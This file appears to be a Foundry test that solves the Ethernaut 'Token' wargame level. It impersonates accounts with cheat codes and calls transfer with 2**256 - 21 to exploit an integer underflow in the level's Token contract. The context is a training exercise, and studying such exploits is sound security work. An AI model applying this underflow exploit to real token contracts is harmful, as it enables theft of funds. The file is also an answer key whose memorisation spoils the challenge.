pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../Token/Token.sol";
import "../Token/TokenFactory.sol";
import "../Ethernaut.sol";

interface CheatCodes {
  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called 
  function startPrank(address) external;
  // Resets subsequent calls' msg.sender to be `address(this)`
  function stopPrank() external;
}

contract TokenTest is DSTest {
    CheatCodes cheats = CheatCodes(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    TokenFactory tokenFactory;
    address levelAddress;
    bool levelSuccessfullyPassed;

    function setUp() public {
        // Setup instances of the Ethernaut & TokenFactory contracts
        ethernaut = new Ethernaut();
        tokenFactory = new TokenFactory();
    }

    function testTokenHack() public {

        // Register the Ethernaut Token level (this would have already been done on Rinkeby)
        ethernaut.registerLevel(tokenFactory);

        // Add some ETH to the 0 address which we will be using 
        payable(address(0)).transfer(1 ether);
        // Use the startPrank cheat which enables us to excute subsequent call as another address (https://onbjerg.github.io/foundry-book/reference/cheatcodes.html)
        cheats.startPrank(address(0));

        // Set up the Level
        levelAddress = ethernaut.createLevelInstance(tokenFactory);

        // Cast the level address to the Token contract class
        Token ethernautToken = Token(payable(levelAddress));

        cheats.stopPrank();
        // Change accounts, have to call the transfer function from a different account
        cheats.startPrank(address(1));

        // Transfer maximum amount of tokens without causing an overflow 
        ethernautToken.transfer(address(0), (2**256 - 21));

        cheats.stopPrank();
        cheats.startPrank(address(0));

        // Submit level to the core Ethernaut contract
        levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));

        // Stop the prank - calls with no longer come from address(0) 
        cheats.stopPrank();

        // Verify the level has passed
        assert(levelSuccessfullyPassed);
    }
}